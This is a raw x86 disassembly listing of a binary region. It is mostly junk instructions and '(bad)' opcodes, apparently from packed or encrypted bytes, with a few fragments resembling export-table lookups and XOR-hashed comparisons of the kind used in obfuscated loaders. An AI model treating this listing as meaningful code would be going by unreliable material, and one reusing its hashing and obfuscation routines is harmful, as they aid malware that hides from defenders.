  4149ff:	outs   dx,DWORD PTR ds:[esi]
  414a00:	mov    ebx,0x8d4b248d
  414a05:	and    dl,al
  414a07:	sti    
  414a08:	out    dx,al
  414a09:	(bad)  
  414a0a:	cmp    ebx,esp
  414a0c:	adc    eax,0x3c4412b9
  414a11:	push   0x28811935
  414a16:	sbb    eax,0xa242c34d
  414a1b:	cmp    BYTE PTR [edi-0x699eb45a],dh
  414a21:	pop    ebx
  414a22:	jg     0x414a0c
  414a24:	xor    bl,BYTE PTR [eax]
  414a26:	iret   
  414a27:	sub    eax,DWORD PTR [ecx]
  414a29:	mov    dl,BYTE PTR [esi-0x3]
  414a2c:	in     eax,dx
  414a2d:	mov    WORD PTR [ecx-0x42],ds
  414a30:	sbb    BYTE PTR [ebx],cl
  414a32:	es (bad) 
  414a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a35:	repnz fdivr st,st(1)
  414a38:	das    
  414a39:	mov    eax,ds:0x7fdde8ed
  414a3e:	jo     0x414a0e
  414a40:	push   ebp
  414a41:	enter  0x6616,0x7c
  414a45:	sub    esp,esp
  414a47:	retf   0x9c31
  414a4a:	sti    
  414a4b:	call   0x109a:0x6a5bfd8c
  414a52:	(bad)  
  414a53:	imul   ah
  414a55:	popf   
  414a56:	inc    eax
  414a57:	rcl    DWORD PTR [eax],0x4d
  414a5a:	mov    bh,0x67
  414a5c:	popa   
  414a5d:	push   eax
  414a5e:	fwait
  414a5f:	(bad)  
  414a60:	sub    al,0x65
  414a62:	xchg   ecx,eax
  414a63:	popa   
  414a64:	or     al,0x51
  414a66:	jnp    0x414a17
  414a68:	push   ebx
  414a69:	test   al,0xe9
  414a6b:	sbb    ebx,DWORD PTR [ecx+esi*1+0x2291aae6]
  414a72:	sbb    BYTE PTR [ebp+0x3b],0xcf
  414a76:	xor    eax,0x15d36ba6
  414a7b:	inc    esi
  414a7c:	fld    TBYTE PTR [ecx]
  414a7e:	push   0x86b359e1
  414a83:	jmp    0x2727:0xdb5e604a
  414a8a:	adc    dl,ch
  414a8c:	sbb    DWORD PTR [edi],edx
  414a8e:	jnp    0x414a3a
  414a90:	xor    DWORD PTR ss:[ebx+0x4c74dc02],esp
  414a97:	jno    0x414a94
  414a99:	int    0x6c
  414a9b:	jno    0x414b0e
  414a9d:	leave  
  414a9e:	icebp  
  414a9f:	xor    esi,ecx
  414aa1:	fadd   QWORD PTR [edi+0x70]
  414aa4:	or     al,BYTE PTR [esi]
  414aa6:	imul   ecx,eax,0xffffff88
  414aa9:	scas   eax,DWORD PTR es:[edi]
  414aaa:	mov    dh,0x85
  414aac:	sbb    bl,BYTE PTR [esi]
  414aae:	repnz out 0x1a,eax
  414ab1:	loopne 0x414ac1
  414ab3:	mov    ebp,0xa4a1e14d
  414ab8:	pusha  
  414ab9:	xchg   esi,eax
  414aba:	mov    ebx,0x4a05efac
  414abf:	fdiv   QWORD PTR [eax-0x39]
  414ac2:	pop    esp
  414ac3:	ret    0x8dfb
  414ac6:	mov    esp,0x82c0fb5a
  414acb:	hlt    
  414acc:	xchg   ecx,eax
  414acd:	leave  
  414ace:	mov    edx,0x13f849c8
  414ad3:	xchg   edi,eax
  414ad4:	(bad)  
  414ad5:	mov    cl,BYTE PTR [edi]
  414ad7:	fcmovbe st,st(2)
  414ad9:	popa   
  414ada:	enter  0x912f,0x44
  414ade:	mov    edi,0xb655214d
  414ae3:	cmp    DWORD PTR [ecx+esi*8+0x56],edx
  414ae7:	dec    eax
  414ae8:	lods   eax,DWORD PTR ds:[esi]
  414ae9:	or     ebp,DWORD PTR [edx-0x41049f9]
  414aef:	scas   al,BYTE PTR es:[edi]
  414af0:	loop   0x414b12
  414af2:	std    
  414af3:	nop
  414af4:	leave  
  414af5:	sub    cl,al
  414af7:	mov    ecx,0xea93c3d2
  414afc:	nop
  414afd:	mov    dh,0xb2
  414aff:	add    esi,edi
  414b01:	or     BYTE PTR [esi+0x35],cl
  414b04:	or     BYTE PTR [eax-0x29],cl
  414b07:	jle    0x414a96
  414b09:	sub    BYTE PTR [ebx+0x4a],0xdb
  414b0d:	or     DWORD PTR [esi-0x48],0x99d02a44
  414b14:	jmp    0xa8e3:0x7b74912d
  414b1b:	dec    ebp
  414b1c:	sti    
  414b1d:	in     eax,0x89
  414b1f:	pusha  
  414b20:	mov    bh,0xa1
  414b22:	ret    0xeb9e
  414b25:	(bad)  
  414b26:	daa    
  414b27:	inc    esi
  414b28:	push   edi
  414b29:	mov    cl,0x5c
  414b2b:	stos   BYTE PTR es:[edi],al
  414b2c:	shl    BYTE PTR [edx+0x36],cl
  414b2f:	arpl   WORD PTR [esi+edi*4-0x52],bx
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	fdiv   DWORD PTR [ecx+0x7b5b4dcd]
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0xbc70707e
  414bc3:	std    
  414bc4:	push   es
  414bc5:	out    dx,eax
  414bc6:	imul   esi,DWORD PTR [ecx-0x1e0e7bf1],0xffffff8e
  414bcd:	sbb    bh,BYTE PTR [eax]
  414bcf:	loope  0x414c4f
  414bd1:	std    
  414bd2:	dec    esp
  414bd3:	jmp    0x3fa4:0x884af1b6
  414bda:	fs push ecx
  414bdc:	test   DWORD PTR [edi-0x49b031f5],eax
  414be2:	add    BYTE PTR [ebx+0x430d796d],dl
  414be8:	lods   eax,DWORD PTR ds:[esi]
  414be9:	and    dh,BYTE PTR [eax+0x47a5dd4]
  414bef:	mov    al,0x83
  414bf1:	adc    edi,DWORD PTR [edi]
  414bf3:	shl    BYTE PTR [ebx-0x7211b05b],1
  414bf9:	ss stos BYTE PTR es:[edi],al
  414bfb:	inc    edx
  414bfc:	mov    dl,0x41
  414bfe:	icebp  
  414bff:	xor    BYTE PTR [ecx+0x4a],bl
  414c02:	push   0xb42cbc46
  414c07:	fisubr DWORD PTR [ebx+0x42]
  414c0a:	fidiv  DWORD PTR [eax-0xa871c75]
  414c10:	ret    0xc915
  414c13:	jmp    FWORD PTR [ebx+0x5c]
  414c16:	out    0xba,al
  414c18:	pop    ebx
  414c19:	add    esi,edi
  414c1b:	leave  
  414c1c:	in     al,dx
  414c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1e:	jp     0x414ba5
  414c20:	push   es
  414c21:	jno    0x414bb1
  414c23:	adc    eax,0xbba2a6a1
  414c28:	(bad)  
  414c2b:	idiv   BYTE PTR [edx-0x2c57b0ad]
  414c31:	out    0xa9,al
  414c33:	lods   al,BYTE PTR ds:[esi]
  414c34:	sub    al,0x5a
  414c36:	jo     0x414bc4
  414c38:	retf   0xcd3a
  414c3b:	and    bh,ch
  414c3d:	(bad)  
  414c3e:	stos   BYTE PTR es:[edi],al
  414c3f:	jno    0x414c6b
  414c41:	sbb    eax,0xb7594d70
  414c46:	scas   al,BYTE PTR es:[edi]
  414c47:	sub    BYTE PTR [ecx],bl
  414c49:	jl     0x414c08
  414c4b:	(bad)  
  414c4c:	call   0x180124d3
  414c51:	cmp    eax,ebx
  414c53:	scas   al,BYTE PTR es:[edi]
  414c54:	fistp  QWORD PTR [eax+0x7c]
  414c57:	mov    ds:0xd63eda26,eax
  414c5c:	outs   dx,BYTE PTR ds:[esi]
  414c5d:	or     ecx,DWORD PTR [esi+0xf]
  414c60:	cmp    ah,BYTE PTR [edx-0x46490be]
  414c66:	sahf   
  414c67:	mov    ch,0xf1
  414c69:	or     bl,BYTE PTR [ecx]
  414c6b:	dec    ebp
  414c6c:	pop    ecx
  414c6d:	pop    ecx
  414c6e:	sar    dl,cl
  414c70:	and    eax,0xcfbdfff1
  414c75:	mov    ds:0x6bb15a6d,al
  414c7a:	shl    dl,cl
  414c7c:	cmp    al,0x8b
  414c7e:	mov    dl,0x92
  414c80:	xchg   ebx,eax
  414c81:	cmc    
  414c82:	sbb    BYTE PTR [ebx],0xc7
  414c85:	mov    ds:0x619ae5c8,eax
  414c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c8b:	shl    DWORD PTR [eax+0x701428cd],cl
  414c91:	popa   
  414c92:	fsub   QWORD PTR [eax+0x2f]
  414c95:	(bad)  
  414c96:	(bad)  
  414c98:	fwait
  414c99:	cmp    DWORD PTR [eax],0xfffffff1
  414c9c:	inc    esi
  414c9d:	ins    BYTE PTR es:[edi],dx
  414c9e:	push   ds
  414c9f:	mov    ebp,0x3aa099a4
  414ca4:	mov    esi,0xa2c3204d
  414ca9:	xor    edi,DWORD PTR [ebx]
  414cab:	xor    ebx,DWORD PTR [ecx-0x2cf341b9]
  414cb1:	sbb    esp,DWORD PTR [ebx+0x57]
  414cb4:	sbb    bl,BYTE PTR gs:[ecx-0x14]
  414cb8:	push   ecx
  414cb9:	call   0x14b1:0xd998a93f
  414cc0:	inc    eax
  414cc1:	xchg   ebp,eax
  414cc2:	mov    esp,0x9a0be40e
  414cc7:	shl    BYTE PTR [edx-0x58],0x7a
  414ccb:	lea    edx,[ebp-0x36efdb63]
  414cd1:	(bad)  
  414cd2:	jmp    0x414c7a
  414cd4:	mov    ah,0x35
  414cd6:	xor    al,0x5d
  414cd8:	in     eax,0xb3
  414cda:	je     0x414d51
  414cdc:	ins    BYTE PTR es:[edi],dx
  414cdd:	fdiv   QWORD PTR [esi]
  414cdf:	std    
  414ce0:	(bad)  
  414ce1:	dec    ebp
  414ce2:	cmp    eax,0xcfb1a3ef
  414ce7:	into   
  414ce8:	pop    ecx
  414ce9:	or     esi,esi
  414ceb:	ds inc eax
  414ced:	loopne 0x414cf9
  414cef:	sub    edi,DWORD PTR [esi]
  414cf1:	fwait
  414cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cf3:	and    cl,ah
  414cf5:	inc    ebp
  414cf6:	cmc    
  414cf7:	enter  0xd374,0xd9
  414cfb:	xor    eax,0x531b68e3
  414d00:	sbb    al,0x63
  414d02:	call   0xb552224e
  414d07:	sub    al,0x4a
  414d09:	push   esp
  414d0a:	test   DWORD PTR [ebx-0x522f1f67],ebp
  414d10:	push   esi
  414d11:	mov    edi,0xab9b1271
  414d16:	add    BYTE PTR ds:0xf5797087,bl
  414d1c:	scas   al,BYTE PTR es:[edi]
  414d1d:	cmp    DWORD PTR [esi+0x36c64149],ebx
  414d23:	jp     0x414cb9
  414d25:	jmp    0x5df4:0xf63ef84a
  414d2c:	out    dx,al
  414d2d:	sti    
  414d2e:	test   DWORD PTR fs:[edi],0xb1057c9a
  414d35:	leave  
  414d36:	ss ja  0x414d45
  414d39:	scas   al,BYTE PTR es:[edi]
  414d3a:	ins    DWORD PTR es:[edi],dx
  414d3b:	sub    DWORD PTR [edi-0x23e1387a],0xa75b5c9e
  414d45:	ja     0x414d38
  414d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d48:	in     al,0xb8
  414d4a:	pop    ebx
  414d4b:	retf   0xeeb
  414d4e:	xchg   esp,eax
  414d4f:	push   ebp
  414d50:	into   
  414d51:	inc    ecx
  414d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d53:	xor    DWORD PTR [edi+0x36],edi
  414d56:	xor    eax,0x7408f9b0
  414d5b:	daa    
  414d5c:	push   esp
  414d5d:	mov    esp,0xb2b86433
  414d62:	es test al,0xee
  414d65:	mov    edi,0xa257bb48
  414d6a:	xor    al,0x7d
  414d6c:	push   ecx
  414d6d:	cmp    al,ch
  414d6f:	ror    dl,1
  414d71:	test   BYTE PTR [edx],0x10
  414d74:	sub    eax,ecx
  414d76:	enter  0x3729,0x5f
  414d7a:	shl    DWORD PTR [ebx-0x3],cl
  414d7d:	fldenv [eax]
  414d7f:	adc    esp,eax
  414d81:	jnp    0x414e02
  414d83:	cmp    eax,0x589463fe
  414d88:	mov    ds:0x4c38103d,eax
  414d8d:	repnz mov bh,cl
  414d90:	mov    ch,0x5b
  414d92:	test   BYTE PTR [edi-0x78a2caad],ah
  414d98:	fadd   QWORD PTR [ebx+0x29]
  414d9b:	fidivr WORD PTR [edx-0x62]
  414d9e:	adc    ch,bl
  414da0:	div    DWORD PTR [ecx+edi*1]
  414da3:	adc    eax,DWORD PTR [ecx+0x6196b6ea]
  414da9:	xlat   BYTE PTR ds:[ebx]
  414daa:	mov    cl,BYTE PTR [ebp-0x5a]
  414dad:	(bad)  
  414dae:	xor    cl,BYTE PTR [esi-0x3317cef0]
  414db4:	add    esp,DWORD PTR [ecx+esi*2-0x250d8000]
  414dbb:	dec    esi
  414dbc:	push   ss
  414dbd:	mov    ah,ch
  414dbf:	ja     0x414db6
  414dc1:	daa    
  414dc2:	xchg   DWORD PTR [esi-0x3a],edi
  414dc5:	clc    
  414dc6:	and    BYTE PTR gs:[eax],dl
  414dc9:	sahf   
  414dca:	aas    
  414dcb:	out    dx,al
  414dcc:	cmp    al,0xe6
  414dce:	retf   0x124a
  414dd1:	sub    al,0xa1
  414dd3:	inc    edi
  414dd4:	pop    eax
  414dd5:	jge    0x414e3e
  414dd7:	mov    ds:0x31fafee6,eax
  414ddc:	mov    eax,0xb90c8164
  414de1:	jne    0x414e01
  414de3:	add    BYTE PTR [edi+0x3e],0x4f
  414de7:	jb     0x414e2a
  414de9:	adc    edx,DWORD PTR [ebp+eiz*4-0x65337014]
  414df0:	dec    edi
  414df1:	test   eax,0x7e243535
  414df6:	mov    eax,0x9e7cf0f8
  414dfb:	(bad)  
  414dfd:	adc    BYTE PTR [edi-0x6f],bh
  414e00:	push   esi
  414e01:	adc    BYTE PTR [ebp+0x5],ch
  414e04:	cld    
  414e05:	cmc    
  414e06:	fsubr  DWORD PTR [ebx-0x7]
  414e09:	add    BYTE PTR [edi],ch
  414e0b:	add    ecx,eax
  414e0d:	jae    0x414e39
  414e0f:	xchg   edx,eax
  414e10:	ins    BYTE PTR es:[edi],dx
  414e11:	mov    ah,0x0
  414e13:	and    eax,0x1d
  414e16:	std    
  414e17:	gs cmc 
  414e19:	jns    0x414ddf
  414e1b:	sahf   
  414e1c:	and    al,0xf9
  414e1e:	xlat   BYTE PTR gs:[ebx]
  414e20:	sbb    al,al
  414e22:	inc    esp
  414e23:	ficomp DWORD PTR [edi+0x19a3a2b8]
  414e29:	jl     0x414e51
  414e2b:	dec    ebp
  414e2c:	out    dx,al
  414e2d:	adc    eax,0x6c2b2ba0
  414e32:	lock js 0x414e6d
  414e35:	das    
  414e36:	sub    al,0xf9
  414e38:	jp     0x414e7a
  414e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e3b:	das    
  414e3c:	mov    bl,0x1a
  414e3e:	sbb    DWORD PTR [edi+ecx*2],0xab94694a
  414e45:	jne    0x414e68
  414e47:	sbb    ecx,esp
  414e49:	aad    0x6f
  414e4b:	mov    BYTE PTR [ecx+0x358886ba],bh
  414e51:	push   ebp
  414e52:	js     0x414de9
  414e54:	mov    bh,0xb8
  414e56:	xchg   edi,eax
  414e57:	pop    esp
  414e58:	lea    ebp,[edx]
  414e5a:	pop    eax
  414e5b:	cmc    
  414e5c:	arpl   sp,bx
  414e5e:	xchg   BYTE PTR [edi+ebx*1],bl
  414e61:	xchg   edi,eax
  414e62:	sub    bh,bl
  414e64:	mov    es,WORD PTR [eax]
  414e66:	add    BYTE PTR [edi],ch
  414e68:	push   esp
  414e69:	je     0x414e9d
  414e6b:	into   
  414e6c:	pusha  
  414e6d:	mov    edi,0x5cbdf6e
  414e72:	aas    
  414e73:	jno    0x414ee9
  414e75:	shl    BYTE PTR [ecx+0x49],cl
  414e78:	test   eax,0xdd8eb361
  414e7d:	popf   
  414e7e:	in     eax,dx
  414e7f:	sbb    dl,BYTE PTR [ecx]
  414e81:	or     BYTE PTR [eax-0x66db336d],bl
  414e87:	or     BYTE PTR ds:0x49056a59,al
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	(bad)  
  414ead:	cli    
  414eae:	int    0x77
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414e88
  414eb9:	shl    BYTE PTR [ebp-0x3ab23317],0x96
  414ec0:	gs pop ebx
  414ec2:	(bad)  
  414ec3:	xchg   ebp,eax
  414ec4:	mov    WORD PTR ss:[ebx],ss
  414ec7:	jnp    0x414eb3
  414ec9:	mov    ebx,0x32f7ec07
  414ece:	mov    esp,0x7c7a20f0
  414ed3:	cli    
  414ed4:	mov    ebp,0x77c2033b
  414ed9:	retf   
  414eda:	dec    eax
  414edb:	sbb    al,0xcc
  414edd:	jg     0x414eca
  414edf:	and    DWORD PTR ds:0x20e4da88,ecx
  414ee5:	xor    bl,BYTE PTR [ebx+0x75508d23]
  414eeb:	mov    dh,0x4e
  414eed:	mov    ds:0xe1b69d13,al
  414ef2:	push   ds
  414ef3:	test   DWORD PTR [ecx+0x73],ebp
  414ef6:	and    eax,ecx
  414ef8:	inc    eax
  414ef9:	shl    DWORD PTR [edx-0xa77758],1
  414eff:	push   esi
  414f00:	in     eax,0x31
  414f02:	add    al,BYTE PTR [esi+eiz*2]
  414f05:	mov    al,0x7b
  414f07:	cmp    BYTE PTR [ebx+ebp*4-0x73],cl
  414f0b:	dec    ecx
  414f0c:	es stos DWORD PTR es:[edi],eax
  414f0e:	adc    edx,DWORD PTR [edi+0x30]
  414f11:	jecxz  0x414ef8
  414f13:	push   eax
  414f14:	mov    eax,ds:0x88e49e6d
  414f19:	cmc    
  414f1a:	icebp  
  414f1b:	or     edi,edx
  414f1d:	adc    ch,BYTE PTR [eax]
  414f1f:	mov    eax,0x10e3b365
  414f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f25:	outs   dx,DWORD PTR ds:[esi]
  414f26:	fild   DWORD PTR [ebp-0x1600ef46]
  414f2c:	xchg   BYTE PTR [ebx-0x4a],ah
  414f2f:	and    dl,BYTE PTR [esi]
  414f31:	push   esi
  414f32:	adc    DWORD PTR [ecx+0x642754da],edx
  414f38:	dec    esp
  414f39:	ficomp WORD PTR [esi+0x72]
  414f3c:	ss push ecx
  414f3e:	imul   edx,DWORD PTR [edx],0xe5e0babe
  414f44:	jecxz  0x414ecf
  414f46:	fstp   TBYTE PTR [ecx]
  414f48:	hlt    
  414f49:	and    DWORD PTR [edx+0x1d],esp
  414f4c:	fnstsw WORD PTR [eax]
  414f4e:	mov    dl,dh
  414f50:	jno    0x414f39
  414f52:	sub    bl,BYTE PTR [ecx-0x49e7bed1]
  414f58:	add    bl,BYTE PTR [ebx]
  414f5a:	cmp    DWORD PTR [edx+edx*1+0x2d3ac26],ecx
  414f61:	ficomp DWORD PTR [esi+0x4dc5d91e]
  414f67:	xor    al,0x47
  414f69:	or     al,0x4d
  414f6b:	push   edx
  414f6c:	xchg   edx,eax
  414f6d:	adc    ah,dl
  414f6f:	(bad)  
  414f70:	fmul   st(5),st
  414f72:	call   0xd260:0x85cec193
  414f79:	out    dx,eax
  414f7a:	ret    
  414f7b:	xor    edx,ebp
  414f7d:	pop    ecx
  414f7e:	or     al,0x8b
  414f80:	nop
  414f81:	push   esi
  414f82:	fidiv  DWORD PTR [esi+0x5bc37149]
  414f88:	or     DWORD PTR [esi-0x1306066d],esp
  414f8e:	out    dx,eax
  414f8f:	dec    esi
  414f90:	out    0x1f,eax
  414f92:	cmp    dl,bl
  414f94:	pop    ebp
  414f95:	out    dx,eax
  414f96:	mov    ah,0xf5
  414f98:	mov    ebp,0x4d6fff62
  414f9d:	pop    edi
  414f9e:	test   BYTE PTR [ecx+0x7d89bd24],al
  414fa4:	(bad)  
  414fa5:	shr    BYTE PTR [esi-0x55fa6db3],1
  414fab:	int3   
  414fac:	mov    eax,ds:0xa587964a
  414fb1:	fdivp  st(0),st
  414fb3:	daa    
  414fb4:	jnp    0x41502c
  414fb6:	ins    DWORD PTR es:[edi],dx
  414fb7:	add    DWORD PTR [ecx],ecx
  414fb9:	sbb    BYTE PTR [eax],dh
  414fbb:	loopne 0x414f4d
  414fbd:	scas   al,BYTE PTR es:[edi]
  414fbe:	inc    eax
  414fbf:	(bad)  [eax+0x5f]
  414fc2:	xchg   ebx,eax
  414fc3:	jge    0x414fd4
  414fc5:	xor    al,0x79
  414fc7:	mov    ah,0xc8
  414fc9:	out    dx,eax
  414fca:	gs enter 0x1938,0xfa
  414fcf:	lds    ebx,FWORD PTR [esi]
  414fd1:	mov    ds:0x5c3347bd,al
  414fd6:	push   cx
  414fd8:	jle    0x414f74
  414fda:	(bad)  
  414fdb:	ror    ecx,1
  414fdd:	dec    ebx
  414fde:	add    eax,0x4e7d0522
  414fe3:	scas   al,BYTE PTR es:[edi]
  414fe4:	add    ecx,edx
  414fe6:	mov    edx,0x92ef6acc
  414feb:	xchg   ecx,eax
  414fec:	xadd   BYTE PTR [ebp+0x21],dl
  414ff0:	and    esi,edx
  414ff2:	push   ecx
  414ff3:	push   esi
  414ff4:	imul   esi,DWORD PTR [edi+esi*8],0xa2404927
  414ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ffc:	and    edi,eax
  414ffe:	push   ebp
  414fff:	xchg   BYTE PTR ds:0x9fea4eda,dh
  415005:	jp     0x415048
  415007:	in     eax,0xde
  415009:	enter  0x6df5,0x84
  41500d:	sbb    DWORD PTR [ebp-0x2d],ebx
  415010:	inc    esi
  415011:	mov    bl,0x24
  415013:	and    DWORD PTR [ebp+0x3c],esp
  415016:	mov    bh,0xfd
  415018:	mov    ah,0x6b
  41501a:	fbld   TBYTE PTR [eax]
  41501c:	(bad)  
  41501e:	sbb    ah,BYTE PTR [esi+ecx*4-0x1e]
  415022:	jns    0x414fd2
  415024:	jge    0x41505a
  415026:	in     al,dx
  415027:	ins    BYTE PTR es:[edi],dx
  415028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415029:	je     0x41504b
  41502b:	test   BYTE PTR [ecx+0x5e26bb91],0x13
  415032:	cmp    edx,DWORD PTR [edx]
  415034:	fwait
  415035:	adc    al,0xf2
  415037:	in     al,0xb
  415039:	not    DWORD PTR [ebp-0xa]
  41503c:	xchg   ecx,eax
  41503d:	pop    edx
  41503e:	adc    al,0xe6
  415040:	add    eax,0x8ff073b8
  415045:	dec    edi
  415046:	(bad)  
  415047:	es jne 0x414ff8
  41504a:	mov    ch,0x72
  41504c:	(bad)  
  41504d:	mov    edx,DWORD PTR [ebp+0x42]
  415050:	xor    dh,BYTE PTR [ecx]
  415052:	shl    BYTE PTR [ecx],cl
  415054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415055:	rcr    BYTE PTR ss:[eax],0xa1
  415059:	cs mov edi,0xa3e1a72d
  41505f:	call   DWORD PTR [bp+si-0x5]
  415063:	js     0x4150c4
  415065:	push   0x7a
  415067:	add    bh,BYTE PTR [ebp-0x60]
  41506a:	test   DWORD PTR [esi+0x4d],esi
  41506d:	cmp    ebp,DWORD PTR [edi+0x43f50190]
  415073:	xchg   ecx,eax
  415074:	mov    bl,0xea
  415076:	(bad)  
  415077:	fadd   QWORD PTR [edi+0x66c61fc3]
  41507d:	push   ebx
  41507e:	mov    ch,0xab
  415080:	jge    0x415041
  415082:	std    
  415083:	jne    0x4150d8
  415085:	in     al,dx
  415086:	test   al,0xb1
  415088:	push   0x24205bfd
  41508d:	mov    bl,0xd6
  41508f:	mov    bh,0x7e
  415091:	std    
  415092:	inc    ebx
  415093:	shl    BYTE PTR [eax+0x65c02626],cl
  415099:	mov    WORD PTR [ecx+0xe2ca9da],?
  41509f:	sbb    esi,DWORD PTR [edi+0x3f33b77e]
  4150a5:	addr16 retf 0x6a49
  4150a9:	add    al,0xc5
  4150ab:	mov    esp,0x81dfb18c
  4150b0:	rcr    bh,0x83
  4150b3:	jp     0x4150bc
  4150b5:	enter  0xa455,0x99
  4150b9:	fnstsw WORD PTR [eax+0x2b3bbe69]
  4150bf:	ja     0x415042
  4150c1:	push   cs
  4150c2:	push   cs
  4150c3:	sub    eax,0x5c326533
  4150c8:	ins    DWORD PTR es:[edi],dx
  4150c9:	add    eax,0x13095614
  4150ce:	fmul   st(5),st
  4150d0:	dec    esp
  4150d1:	arpl   WORD PTR [ebx+0x79],cx
  4150d4:	adc    ecx,eax
  4150d6:	(bad)  [edx-0x2da86dc6]
  4150dc:	jae    0x415106
  4150de:	retf   
  4150df:	add    DWORD PTR [eax+0xe],0xab024ae2
  4150e6:	fisttp DWORD PTR [ebx-0x7f]
  4150e9:	add    al,0x81
  4150eb:	xor    al,BYTE PTR [esi]
  4150ed:	pop    eax
  4150ee:	xor    bl,BYTE PTR [ebx]
  4150f0:	call   0xdc40:0xeea8a09a
  4150f7:	mov    esp,0x4d464a35
  4150fc:	mov    eax,ds:0x6bc28cba
  415101:	jo     0x415089
  415103:	dec    ecx
  415104:	lahf   
  415105:	adc    al,0xdd
  415107:	jl     0x4150fa
  415109:	inc    esp
  41510a:	jbe    0x415108
  41510c:	xchg   esp,eax
  41510d:	(bad)  
  41510e:	outs   dx,DWORD PTR ds:[esi]
  41510f:	push   esi
  415110:	cmp    esi,edx
  415112:	or     esi,eax
  415114:	test   eax,0xdb83a8cb
  415119:	jno    0x415168
  41511b:	inc    ebx
  41511c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41511d:	int3   
  41511e:	sahf   
  41511f:	mov    esi,0x8a2f9f3c
  415124:	jmp    FWORD PTR [eax+ebp*1]
  415127:	cmp    DWORD PTR [ebp-0x244b8f8e],edi
  41512d:	ret    
  41512e:	maxps  xmm0,XMMWORD PTR [esi-0x5f756ae5]
  415135:	fld    TBYTE PTR [edx-0x1f]
  415138:	and    dh,BYTE PTR [edx]
  41513a:	sub    ecx,eax
  41513c:	sub    ah,dl
  41513e:	test   BYTE PTR ds:0x6431c5a9,bh
  415144:	xchg   edx,eax
  415145:	mov    DWORD PTR [edi],0x85fcd070
  41514b:	iretw  
  41514d:	fwait
  41514e:	dec    edi
  41514f:	cli    
  415150:	inc    ebp
  415151:	(bad)  
  415152:	lds    ebp,FWORD PTR [ecx]
  415154:	cs sub eax,0x85efa311
  41515a:	pop    ecx
  41515b:	pop    ss
  41515c:	jmp    0xea25295b
  415161:	in     eax,0xaf
  415163:	inc    edi
  415164:	xor    esp,0xb9435871
  41516a:	fidivr WORD PTR [ecx]
  41516c:	neg    BYTE PTR [esi-0x23fb3f2a]
  415172:	adc    bl,BYTE PTR [esi+edx*4+0x206f7d49]
  415179:	test   al,0x99
  41517b:	jecxz  0x4151a7
  41517d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41517e:	(bad)  
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fld    st(0)
  4151a5:	repnz dec ecx
  4151a7:	shr    ebp,1
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	add    dh,al
  4151b2:	inc    edx
  4151b3:	sbb    BYTE PTR [esp+ecx*1],0x17
  4151b7:	push   cs
  4151b8:	xchg   edx,eax
  4151b9:	inc    edi
  4151ba:	push   0x6d
  4151bc:	xchg   esi,eax
  4151bd:	(bad)  
  4151be:	icebp  
  4151bf:	and    eax,0x478c1f9b
  4151c4:	jno    0x41514e
  4151c6:	imul   edi,DWORD PTR [edi],0xffffff8a
